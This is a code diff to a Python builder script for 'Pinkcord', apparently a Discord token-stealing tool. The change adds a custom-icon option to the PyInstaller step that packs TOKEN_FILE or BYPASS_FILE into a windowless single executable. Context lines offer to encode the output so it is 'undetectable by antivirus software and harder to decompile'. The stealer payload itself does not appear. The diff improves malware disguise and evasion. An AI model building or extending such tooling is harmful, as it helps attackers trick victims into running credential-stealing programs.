@@ -69,6 +69,14 @@ if answer == "1":
     input('Press ENTER when you finish testing')
 clear_console()
 print(asciart)
+print("do you want to set a custom icon for your Pinkcord?")
+print('1. Yes')
+print('2. No')
+answer = input("Choice: ")
+if answer == "1":
+    icon = input("enter the path to your .ico file: ")
+clear_console()
+print(asciart)
 print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
 print('1. Yes')
 print('2. No')
@@ -93,11 +101,19 @@ if answer == "1":
     print(asciart)
     import PyInstaller.__main__
     print("Generating exe file...")
-    params = [
-        '--onefile',
-        '--windowed',
-        BYPASS_FILE
-    ]
+    if "icon" in globals():
+        params = [
+            '--onefile',
+            '--windowed',
+            f'--icon={icon}',
+            BYPASS_FILE
+        ]
+    else: 
+        params = [
+            '--onefile',
+            '--windowed',
+            BYPASS_FILE
+        ]
     PyInstaller.__main__.run(params)
     clear_console()
     print(asciart)
@@ -108,11 +124,19 @@ else:
     print(asciart)
     import PyInstaller.__main__
     print("Generating exe file...")
-    params = [
-        '--onefile',
-        '--windowed',
-        TOKEN_FILE
-    ]
+    if "icon" in globals():
+        params = [
+            '--onefile',
+            '--windowed',
+            f'--icon={icon}',
+            TOKEN_FILE
+        ]
+    else:
+        params = [
+            '--onefile',
+            '--windowed',
+            TOKEN_FILE
+        ]
     PyInstaller.__main__.run(params)
     clear_console()
     print(asciart)
